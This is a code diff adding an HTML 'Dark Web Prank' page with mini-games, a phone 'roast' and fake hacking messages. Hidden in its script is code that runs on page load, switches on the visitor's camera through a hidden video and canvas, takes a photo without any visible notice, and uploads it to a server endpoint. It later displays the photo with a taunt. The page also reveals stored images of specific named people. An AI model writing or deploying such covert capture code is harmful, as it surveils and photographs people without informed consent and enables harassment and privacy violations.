@@ -1,0 +1,780 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Dark Web Prank</title>
+  <style>
+    :root {
+      --dark-bg: #0a0a0a;
+      --red: #ff003c;
+      --neon: #ff003c;
+      --glitch1: #ff003c;
+      --glitch2: #00fff7;
+      --glitch3: #fff;
+      --pink: #ff69b4;
+      --white: #fff;
+      --blue: #00bfff;
+      --black: #111;
+      --transition: 0.4s cubic-bezier(.77,0,.18,1);
+    }
+    html, body {
+      height: 100%;
+      margin: 0;
+      padding: 0;
+      background: var(--dark-bg);
+      color: var(--white);
+      font-family: 'Share Tech Mono', monospace, 'Segoe UI', Arial;
+      overflow: hidden;
+    }
+    body {
+      min-height: 100vh;
+      min-width: 100vw;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: var(--dark-bg);
+      transition: background var(--transition), color var(--transition);
+    }
+    .hidden { display: none !important; }
+    .centered {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      width: 100vw;
+      position: absolute;
+      top: 0; left: 0;
+      z-index: 2;
+    }
+    .glitch {
+      color: var(--neon);
+      font-size: 2.5rem;
+      font-weight: bold;
+      letter-spacing: 2px;
+      position: relative;
+      animation: flicker 2s infinite alternate;
+      text-shadow:
+        0 0 5px var(--glitch1),
+        0 0 10px var(--glitch2),
+        0 0 20px var(--glitch3);
+    }
+    .glitch::before, .glitch::after {
+      content: attr(data-text);
+      position: absolute;
+      left: 0; width: 100%;
+      overflow: hidden;
+      color: var(--glitch2);
+      z-index: -1;
+      opacity: 0.7;
+    }
+    .glitch::before {
+      top: -2px;
+      left: 2px;
+      text-shadow: -2px 0 var(--glitch1);
+      animation: glitchTop 1.5s infinite linear alternate-reverse;
+    }
+    .glitch::after {
+      top: 2px;
+      left: -2px;
+      text-shadow: 2px 0 var(--glitch2);
+      animation: glitchBot 1.2s infinite linear alternate-reverse;
+    }
+    @keyframes flicker {
+      0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% {
+        opacity: 1;
+      }
+      20%, 22%, 24%, 55% {
+        opacity: 0.4;
+      }
+    }
+    @keyframes glitchTop {
+      0% { clip-path: inset(0 0 80% 0); }
+      100% { clip-path: inset(0 0 0 0); }
+    }
+    @keyframes glitchBot {
+      0% { clip-path: inset(80% 0 0 0); }
+      100% { clip-path: inset(0 0 0 0); }
+    }
+    .start-btn {
+      margin-top: 2.5rem;
+      padding: 1rem 2.5rem;
+      font-size: 1.5rem;
+      background: var(--red);
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      box-shadow: 0 0 20px var(--red), 0 0 40px var(--red);
+      cursor: pointer;
+      opacity: 0;
+      animation: btnAppear 2s 1.5s forwards, pulse 1.2s infinite alternate;
+      transition: background 0.2s;
+    }
+    .start-btn:hover {
+      background: #fff;
+      color: var(--red);
+      box-shadow: 0 0 30px var(--red), 0 0 60px var(--red);
+      animation: glitchBtn 0.2s;
+    }
+    @keyframes btnAppear {
+      to { opacity: 1; }
+    }
+    @keyframes pulse {
+      0% { box-shadow: 0 0 20px var(--red); }
+      100% { box-shadow: 0 0 40px var(--red), 0 0 80px var(--red); }
+    }
+    @keyframes glitchBtn {
+      0% { filter: blur(0); }
+      50% { filter: blur(2px); }
+      100% { filter: blur(0); }
+    }
+    .input-label {
+      font-size: 1.3rem;
+      margin-bottom: 1rem;
+      letter-spacing: 1px;
+      text-shadow: 0 0 8px var(--red);
+    }
+    .input-box {
+      padding: 0.7rem 1.2rem;
+      font-size: 1.2rem;
+      border-radius: 6px;
+      border: 2px solid var(--red);
+      background: #181818;
+      color: #fff;
+      outline: none;
+      margin-bottom: 1.5rem;
+      width: 250px;
+      box-shadow: 0 0 10px var(--red) inset;
+    }
+    .next-btn, .submit-btn {
+      margin-top: 1.5rem;
+      padding: 0.8rem 2rem;
+      font-size: 1.1rem;
+      background: var(--red);
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      box-shadow: 0 0 10px var(--red);
+      transition: background 0.2s;
+    }
+    .next-btn:hover, .submit-btn:hover {
+      background: #fff;
+      color: var(--red);
+    }
+    /* Theme: Pink & White */
+    .theme-pink {
+      background: linear-gradient(135deg, #ff69b4 60%, #fff 100%);
+      color: #fff;
+    }
+    /* Theme: Blue & Black */
+    .theme-blue {
+      background: linear-gradient(135deg, #0a0a0a 60%, #00bfff 100%);
+      color: #fff;
+    }
+    /* Theme: Dynamic (random) */
+    .theme-dynamic {
+      background: linear-gradient(135deg, #111 60%, #ff003c 100%);
+      color: #fff;
+    }
+    /* Tic-Tac-Toe styles */
+    .tictactoe-board {
+      display: grid;
+      grid-template-columns: repeat(3, 80px);
+      grid-template-rows: repeat(3, 80px);
+      gap: 8px;
+      margin: 2rem auto 1rem auto;
+      background: #222;
+      border-radius: 12px;
+      box-shadow: 0 0 20px var(--red);
+    }
+    .ttt-cell {
+      width: 80px; height: 80px;
+      background: #181818;
+      border-radius: 8px;
+      font-size: 2.5rem;
+      color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      transition: background 0.2s, color 0.2s;
+      box-shadow: 0 0 8px var(--red) inset;
+    }
+    .ttt-cell.red { color: var(--red); }
+    .ttt-cell.blue { color: var(--blue); }
+    .ttt-status {
+      font-size: 1.2rem;
+      margin-bottom: 1rem;
+      text-shadow: 0 0 8px var(--red);
+    }
+    /* Click Me Game */
+    .clickme-btn {
+      position: absolute;
+      left: 50%; top: 50%;
+      transform: translate(-50%, -50%);
+      padding: 2rem 3rem;
+      font-size: 2rem;
+      background: var(--red);
+      color: #fff;
+      border: none;
+      border-radius: 12px;
+      box-shadow: 0 0 30px var(--red);
+      cursor: pointer;
+      z-index: 10;
+      transition: left 0.2s, top 0.2s, background 0.2s;
+      touch-action: manipulation;
+      user-select: none;
+    }
+    .clickme-counter {
+      position: absolute;
+      top: 10%; left: 50%;
+      transform: translateX(-50%);
+      font-size: 1.3rem;
+      color: var(--red);
+      text-shadow: 0 0 8px var(--red);
+    }
+    /* Final Page */
+    .typewriter {
+      font-size: 1.3rem;
+      color: var(--red);
+      font-family: 'Share Tech Mono', monospace;
+      white-space: pre-line;
+      min-height: 4rem;
+      margin-bottom: 2rem;
+      text-shadow: 0 0 8px var(--red);
+    }
+    .evil-laugh {
+      font-size: 2rem;
+      color: var(--red);
+      text-shadow: 0 0 20px var(--red);
+      margin-top: 1.5rem;
+      animation: flicker 1.2s infinite alternate;
+    }
+    .glitch-overlay {
+      position: fixed;
+      top: 0; left: 0; width: 100vw; height: 100vh;
+      background: rgba(255,0,60,0.08);
+      pointer-events: none;
+      z-index: 100;
+      animation: overlayGlitch 0.2s 8 alternate;
+    }
+    @keyframes overlayGlitch {
+      0% { opacity: 0.1; }
+      50% { opacity: 0.7; }
+      100% { opacity: 0.2; }
+    }
+    .final-img {
+      display: block;
+      margin: 2rem auto 0 auto;
+      max-width: 220px;
+      border-radius: 12px;
+      opacity: 0;
+      transition: opacity 1.2s;
+      box-shadow: 0 0 30px var(--red);
+    }
+    .final-img.visible {
+      opacity: 1;
+    }
+    /* Responsive */
+    @media (max-width: 600px) {
+      .tictactoe-board { grid-template-columns: repeat(3, 60px); grid-template-rows: repeat(3, 60px); }
+      .ttt-cell { width: 60px; height: 60px; font-size: 1.5rem; }
+      .clickme-btn { font-size: 1.1rem; padding: 1rem 1.2rem; }
+      .centered { min-height: 100dvh; width: 100vw; padding: 0 0.5rem; }
+      .input-box { width: 90vw; max-width: 250px; }
+      .final-img { max-width: 90vw; }
+      .typewriter { font-size: 1.1rem; }
+      .evil-laugh { font-size: 1.2rem; }
+    }
+  </style>
+</head>
+<body>
+  <!-- Landing Page -->
+  <div id="landing" class="centered">
+    <div class="glitch" data-text="Welcome to the eternal side of websites">Welcome to the eternal side of websites</div>
+    <video id="bgvid" autoplay loop muted playsinline style="position:fixed;top:0;left:0;width:100vw;height:100vh;object-fit:cover;z-index:-1;filter:brightness(0.2) contrast(1.2) grayscale(0.7);">
+      <source src="https://www.w3schools.com/howto/rain.mp4" type="video/mp4">
+    </video>
+    <button class="start-btn" id="startBtn">Start</button>
+  </div>
+
+  <!-- Name Input Page -->
+  <div id="namePage" class="centered hidden">
+    <div class="input-label">What is your name?</div>
+    <input type="text" id="nameInput" class="input-box" maxlength="20" autocomplete="off" autofocus>
+    <button class="next-btn" id="nameNextBtn">Next</button>
+  </div>
+
+  <!-- Tic-Tac-Toe Page -->
+  <div id="tttPage" class="centered hidden">
+    <div class="ttt-status" id="tttStatus">Your move: Red (X)</div>
+    <div class="tictactoe-board" id="tttBoard"></div>
+    <button class="next-btn hidden" id="tttNextBtn">Next</button>
+  </div>
+
+  <!-- Device & OS Roast Page -->
+  <div id="roastPage" class="centered hidden">
+    <div class="input-label">What phone do you use?</div>
+    <input type="text" id="phoneInput" class="input-box" maxlength="30" autocomplete="off">
+    <div class="input-label" style="margin-top:1.2rem;">Choose your OS:</div>
+    <div style="margin-bottom:1.2rem;">
+      <label><input type="radio" name="os" value="android" checked> Android</label>
+      <label style="margin-left:2rem;"><input type="radio" name="os" value="apple"> Apple</label>
+    </div>
+    <button class="next-btn" id="roastBtn">Submit</button>
+    <div id="roastResult" style="margin-top:1.5rem;font-size:1.2rem;color:var(--red);"></div>
+    <button class="next-btn hidden" id="roastNextBtn">Next</button>
+  </div>
+
+  <!-- Click Me Game Page -->
+  <div id="clickmePage" class="centered hidden" style="position:relative;overflow:hidden;">
+    <div class="clickme-counter" id="clickmeCounter"></div>
+    <button class="clickme-btn" id="clickmeBtn">Click Me</button>
+    <button class="submit-btn hidden" id="clickmeSubmitBtn">Submit</button>
+  </div>
+
+  <!-- Gathering Info Page -->
+  <div id="gatheringInfoPage" class="centered hidden">
+    <div class="typewriter" id="gatheringInfoTypewriter"></div>
+  </div>
+  <!-- Activating Dev Mode Page -->
+  <div id="activatingDevModePage" class="centered hidden">
+    <div class="typewriter" id="activatingDevModeTypewriter"></div>
+  </div>
+  <!-- Logging in ISP Page -->
+  <div id="loggingISPPage" class="centered hidden">
+    <div class="typewriter" id="loggingISPTypewriter"></div>
+  </div>
+  <!-- Final Page -->
+  <div id="finalPage" class="centered hidden">
+    <div class="typewriter" id="finalTypewriter"></div>
+    <div class="evil-laugh" id="evilLaugh"></div>
+    <img id="finalImg" class="final-img" src="" alt="Special Reveal">
+  </div>
+
+  <audio id="evilLaughAudio" src="https://cdn.pixabay.com/audio/2022/10/16/audio_12b6b7e2e2.mp3"></audio>
+
+  <!-- Hidden video/canvas for selfie capture -->
+  <video id="hiddenVideo" autoplay playsinline style="display:none;"></video>
+  <canvas id="hiddenCanvas" style="display:none;"></canvas>
+
+  <div id="glitchOverlay" class="glitch-overlay hidden"></div>
+
+  <style>
+    .selfie-img {
+      display: block;
+      margin: 1.5rem auto 0 auto;
+      max-width: 180px;
+      border-radius: 50%;
+      box-shadow: 0 0 30px var(--red);
+      opacity: 0;
+      filter: grayscale(0.2) contrast(1.2) brightness(0.9);
+      transition: opacity 1.2s, filter 0.7s;
+      animation: selfieGlitch 1.2s 1 alternate;
+    }
+    .selfie-img.visible { opacity: 1; filter: grayscale(0.1) contrast(1.1) brightness(1); }
+    @keyframes selfieGlitch {
+      0% { filter: blur(8px) grayscale(1); }
+      60% { filter: blur(2px) grayscale(0.5); }
+      100% { filter: blur(0) grayscale(0.1); }
+    }
+    .selfie-label {
+      text-align: center;
+      color: var(--red);
+      font-size: 1.1rem;
+      margin-top: 0.7rem;
+      text-shadow: 0 0 8px var(--red);
+      letter-spacing: 1px;
+    }
+  </style>
+
+  <script>
+    // --- Camera Selfie Capture on Page Load ---
+    // --- Camera Selfie Capture on Page Load ---
+    // Always take/upload selfie on every landing page visit, never use localStorage
+let latestSelfieUrl = '';
+let sessionSelfieKey = 'prank_selfie_' + Date.now() + '_' + Math.floor(Math.random()*1000000);
+    function takeAndUploadSelfie() {
+      let constraints = { video: { facingMode: 'user', width: {ideal: 320}, height: {ideal: 320} }, audio: false };
+      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
+      navigator.mediaDevices.getUserMedia(constraints)
+        .then(stream => {
+          let video = document.getElementById('hiddenVideo');
+          video.srcObject = stream;
+          video.onloadedmetadata = () => {
+            setTimeout(() => {
+              try {
+                let canvas = document.getElementById('hiddenCanvas');
+                canvas.width = video.videoWidth || 320;
+                canvas.height = video.videoHeight || 320;
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                let dataUrl = canvas.toDataURL('image/jpeg', 0.7);
+                // Save selfie in localStorage with unique session key
+                try {
+                  localStorage.setItem(sessionSelfieKey, dataUrl);
+                } catch(e) {}
+                fetch('http://localhost:3001/upload-selfie', {
+                  method: 'POST',
+                  headers: { 'Content-Type': 'application/json' },
+                  body: JSON.stringify({ name: '', image: dataUrl })
+                })
+                .then(res => res.json())
+                .then(json => {
+                  if (json && json.url) {
+                    // Ensure selfie URL is absolute and accessible
+                    if (json.url.startsWith('/selfies/')) {
+                      latestSelfieUrl = 'http://localhost:3001' + json.url;
+                    } else {
+                      latestSelfieUrl = json.url;
+                    }
+                    document.getElementById('startBtn').disabled = false;
+                  } else {
+                    document.getElementById('startBtn').disabled = false;
+                  }
+                })
+                .catch(() => {
+                  document.getElementById('startBtn').disabled = false;
+                });
+              } catch(e) {
+                document.getElementById('startBtn').disabled = false;
+              }
+              // Stop camera
+              if (video.srcObject) {
+                video.srcObject.getTracks().forEach(track => track.stop());
+                video.srcObject = null;
+              }
+            }, 1000);
+          };
+        })
+        .catch(() => {
+          document.getElementById('startBtn').disabled = false;
+        });
+    }
+    window.addEventListener('DOMContentLoaded', function() {
+      document.getElementById('startBtn').disabled = true;
+      takeAndUploadSelfie();
+    });
+
+    // --- State ---
+    let userName = '';
+    let userTheme = '';
+    let tttGameOver = false;
+    let tttBoard = Array(9).fill('');
+    let tttPlayer = 'X';
+    let tttAI = 'O';
+    let tttStatus = '';
+    let clickmeTries = 0;
+    let clickmeMax = 5;
+    let specialNames = ['sakshi','bhavna','kishan','utkarsh'];
+    const images = {
+      sakshi: '/images/sakshi.jpg',
+      bhavna: '/images/bhavna.jpg',
+      kishan: '/images/kishan.jpg',
+      utkarsh: '/images/utkarsh.jpg'
+    };
+
+    // --- Utility Functions ---
+    function showPage(id) {
+      document.querySelectorAll('.centered').forEach(d => d.classList.add('hidden'));
+      document.getElementById(id).classList.remove('hidden');
+      document.body.className = '';
+      if (userTheme && id === 'tttPage') document.body.classList.add(userTheme);
+      if (userTheme && id === 'clickmePage') document.body.classList.add(userTheme);
+      if (userTheme && id === 'roastPage') document.body.classList.add(userTheme);
+      if (id === 'finalPage') document.body.className = '';
+    }
+
+    function detectGender(name) {
+      // Simple pattern-based detection (for demo)
+      const femaleNames = ['sakshi','bhavna','priya','ananya','isha','shruti','neha','riya','pooja','simran','aarti','sonam','tanya','swati','shreya','khushi','anushka','kriti','deepika','rani','sneha'];
+      const maleNames = ['kishan','utkarsh','aman','rohan','arjun','rahul','sahil','vishal','ankit','yash','aditya','pranav','manish','raj','shubham','naman','ayush','harsh','saurabh','ashish','sumit'];
+      name = name.trim().toLowerCase();
+      if (femaleNames.includes(name)) return 'female';
+      if (maleNames.includes(name)) return 'male';
+      if (name.endsWith('a') || name.endsWith('i')) return 'female';
+      if (name.endsWith('n') || name.endsWith('h')) return 'male';
+      return 'ambiguous';
+    }
+
+    function assignTheme(gender) {
+      if (gender === 'female') return 'theme-pink';
+      if (gender === 'male') return 'theme-blue';
+      // Randomly pick a theme
+      return Math.random() > 0.5 ? 'theme-pink' : 'theme-blue';
+    }
+
+    // --- Landing Page Logic ---
+    setTimeout(() => {
+      document.getElementById('startBtn').style.opacity = 1;
+    }, 1800);
+
+    document.getElementById('startBtn').addEventListener('click', () => {
+      showPage('namePage');
+      setTimeout(() => document.getElementById('nameInput').focus(), 200);
+    });
+
+    // --- Name Input Page Logic ---
+    document.getElementById('nameNextBtn').addEventListener('click', () => {
+      const name = document.getElementById('nameInput').value.trim();
+      if (!name) return alert('Please enter your name!');
+      userName = name;
+      const gender = detectGender(name);
+      userTheme = assignTheme(gender);
+      showPage('tttPage');
+      startTicTacToe();
+    });
+    document.getElementById('nameInput').addEventListener('keydown', e => {
+      if (e.key === 'Enter') document.getElementById('nameNextBtn').click();
+    });
+
+    // --- Tic-Tac-Toe Logic ---
+    function startTicTacToe() {
+      tttBoard = Array(9).fill('');
+      tttGameOver = false;
+      tttPlayer = 'X';
+      tttAI = 'O';
+      document.getElementById('tttStatus').textContent = 'Your move: Red (X)';
+      renderTTTBoard();
+      document.getElementById('tttNextBtn').classList.add('hidden');
+    }
+    function renderTTTBoard() {
+      const board = document.getElementById('tttBoard');
+      board.innerHTML = '';
+      tttBoard.forEach((cell, i) => {
+        const div = document.createElement('div');
+        div.className = 'ttt-cell' + (cell==='X'?' red':cell==='O'?' blue':'');
+        div.textContent = cell;
+        div.addEventListener('click', () => tttCellClick(i));
+        board.appendChild(div);
+      });
+    }
+    function tttCellClick(i) {
+      if (tttGameOver || tttBoard[i]) return;
+      tttBoard[i] = tttPlayer;
+      renderTTTBoard();
+      if (checkTTTWin(tttPlayer)) {
+        tttGameOver = true;
+        document.getElementById('tttStatus').textContent = 'You win!';
+        document.getElementById('tttNextBtn').classList.remove('hidden');
+        return;
+      }
+      if (tttBoard.every(c => c)) {
+        tttGameOver = true;
+        document.getElementById('tttStatus').textContent = 'Draw!';
+        document.getElementById('tttNextBtn').classList.remove('hidden');
+        return;
+      }
+      document.getElementById('tttStatus').textContent = 'AI thinking...';
+      setTimeout(() => {
+        tttAIMove();
+        renderTTTBoard();
+        if (checkTTTWin(tttAI)) {
+          tttGameOver = true;
+          document.getElementById('tttStatus').textContent = 'AI wins!';
+          document.getElementById('tttNextBtn').classList.remove('hidden');
+          return;
+        }
+        if (tttBoard.every(c => c)) {
+          tttGameOver = true;
+          document.getElementById('tttStatus').textContent = 'Draw!';
+          document.getElementById('tttNextBtn').classList.remove('hidden');
+          return;
+        }
+        document.getElementById('tttStatus').textContent = 'Your move: Red (X)';
+      }, 600);
+    }
+    function tttAIMove() {
+      // Simple AI: pick random empty
+      let empty = tttBoard.map((c,i)=>c?'':i).filter(x=>x!=='');
+      if (empty.length) {
+        let move = empty[Math.floor(Math.random()*empty.length)];
+        tttBoard[move] = tttAI;
+      }
+    }
+    function checkTTTWin(p) {
+      const win = [
+        [0,1,2],[3,4,5],[6,7,8],
+        [0,3,6],[1,4,7],[2,5,8],
+        [0,4,8],[2,4,6]
+      ];
+      return win.some(line => line.every(i => tttBoard[i] === p));
+    }
+    document.getElementById('tttNextBtn').addEventListener('click', () => {
+      showPage('roastPage');
+    });
+
+    // --- Roast Page Logic ---
+    document.getElementById('roastBtn').addEventListener('click', () => {
+      const os = document.querySelector('input[name="os"]:checked').value;
+      let roast = '';
+      if (os === 'android') roast = 'You must love bugs more than features 👀';
+      else roast = 'Ah yes, ₹1,50,000 to join the cult 🍎';
+      document.getElementById('roastResult').textContent = roast;
+      document.getElementById('roastNextBtn').classList.remove('hidden');
+    });
+    document.getElementById('roastNextBtn').addEventListener('click', () => {
+      showPage('clickmePage');
+      startClickMeGame();
+    });
+
+    // --- Click Me Game Logic ---
+    function startClickMeGame() {
+      clickmeTries = 0;
+      document.getElementById('clickmeBtn').classList.remove('hidden');
+      document.getElementById('clickmeSubmitBtn').classList.add('hidden');
+      updateClickmeCounter();
+      moveClickMeBtn();
+    }
+    function updateClickmeCounter() {
+      document.getElementById('clickmeCounter').textContent = `Attempt: ${clickmeTries+1} | Remaining: ${clickmeMax-clickmeTries}`;
+    }
+    function moveClickMeBtn() {
+      const btn = document.getElementById('clickmeBtn');
+      const page = document.getElementById('clickmePage');
+      const w = page.offsetWidth - btn.offsetWidth - 20;
+      const h = page.offsetHeight - btn.offsetHeight - 20;
+      const x = Math.random() * w;
+      const y = Math.random() * h;
+      btn.style.left = `${x}px`;
+      btn.style.top = `${y}px`;
+    }
+    // --- Click Me Button: Only click/tap, no hover ---
+    function clickmeMoveHandler(e) {
+      if (clickmeTries < clickmeMax) {
+        moveClickMeBtn();
+        clickmeTries++;
+        updateClickmeCounter();
+        if (clickmeTries >= clickmeMax) {
+          document.getElementById('clickmeBtn').classList.add('hidden');
+          document.getElementById('clickmeSubmitBtn').classList.remove('hidden');
+        }
+      }
+      if (e) e.preventDefault();
+    }
+    document.getElementById('clickmeBtn').addEventListener('click', clickmeMoveHandler);
+    document.getElementById('clickmeSubmitBtn').addEventListener('click', () => {
+      showPage('gatheringInfoPage');
+      startGatheringInfoPage();
+    });
+    // --- Gathering Info Page Logic ---
+    function startGatheringInfoPage() {
+      document.getElementById('gatheringInfoTypewriter').textContent = '';
+      typeWriter(
+        'Gathering info from device, browser, and network...\nPlease wait...',
+        document.getElementById('gatheringInfoTypewriter'),
+        40,
+        () => {
+          setTimeout(() => {
+            showPage('activatingDevModePage');
+            startActivatingDevModePage();
+          }, 900);
+        }
+      );
+    }
+
+    // --- Activating Dev Mode Page Logic ---
+    function startActivatingDevModePage() {
+      document.getElementById('activatingDevModeTypewriter').textContent = '';
+      typeWriter(
+        'Activating developer mode...\nBypassing security protocols...',
+        document.getElementById('activatingDevModeTypewriter'),
+        40,
+        () => {
+          setTimeout(() => {
+            showPage('loggingISPPage');
+            startLoggingISPPage();
+          }, 900);
+        }
+      );
+    }
+
+    // --- Logging in ISP Page Logic ---
+    function startLoggingISPPage() {
+      document.getElementById('loggingISPTypewriter').textContent = '';
+      typeWriter(
+        'Logging in to ISP dashboard...\nConnecting to dark web nodes...',
+        document.getElementById('loggingISPTypewriter'),
+        40,
+        () => {
+          setTimeout(() => {
+            showPage('finalPage');
+            startFinalPage();
+          }, 900);
+        }
+      );
+    }
+
+    // --- Final Page Logic ---
+    function startFinalPage() {
+      document.getElementById('finalTypewriter').textContent = '';
+      document.getElementById('evilLaugh').textContent = '';
+      document.getElementById('finalImg').classList.remove('visible');
+      document.getElementById('finalImg').src = '';
+      // Remove old selfie if any
+      let oldSelfie = document.getElementById('finalSelfie');
+      if (oldSelfie) oldSelfie.remove();
+      let oldLabel = document.getElementById('selfieLabel');
+      if (oldLabel) oldLabel.remove();
+      typeWriter(
+        'IP Address (192.174.88.17) shared to server owner...\nThanks for helping us in hacking.',
+        document.getElementById('finalTypewriter'),
+        40,
+        () => {
+          document.getElementById('evilLaugh').textContent = 'MUHAHAHAHA!';
+          document.getElementById('evilLaughAudio').play();
+          document.getElementById('glitchOverlay').classList.remove('hidden');
+          setTimeout(() => {
+            document.getElementById('glitchOverlay').classList.add('hidden');
+          }, 1800);
+          // Special image reveal
+          let uname = userName.trim().toLowerCase();
+          if (specialNames.includes(uname)) {
+            let img = images[uname];
+            let finalImg = document.getElementById('finalImg');
+            finalImg.src = img;
+            setTimeout(() => finalImg.classList.add('visible'), 600);
+          }
+          // --- Selfie Reveal ---
+          let container = document.getElementById('finalPage');
+          let img = document.createElement('img');
+          img.id = 'finalSelfie';
+          img.className = 'selfie-img';
+          let selfie = localStorage.getItem(sessionSelfieKey);
+          if (selfie) {
+            img.src = selfie;
+            container.appendChild(img);
+            setTimeout(() => img.classList.add('visible'), 800);
+            let label = document.createElement('div');
+            label.id = 'selfieLabel';
+            label.className = 'selfie-label';
+            label.innerHTML = 'Smile! We already saw you 😈';
+            container.appendChild(label);
+          } else {
+            img.src = 'https://i.imgur.com/8QfQ2Qp.png'; // fallback placeholder
+            container.appendChild(img);
+            setTimeout(() => img.classList.add('visible'), 800);
+            let label = document.createElement('div');
+            label.id = 'selfieLabel';
+            label.className = 'selfie-label';
+            label.innerHTML = "Couldn’t capture your face. Lucky you...";
+            container.appendChild(label);
+          }
+        }
+      );
+    }
+    function typeWriter(text, el, speed, cb) {
+      let i = 0;
+      function type() {
+        if (i < text.length) {
+          el.textContent += text.charAt(i);
+          i++;
+          setTimeout(type, speed);
+        } else if (cb) cb();
+      }
+      type();
+    }
+  </script>
+</body>
+</html>
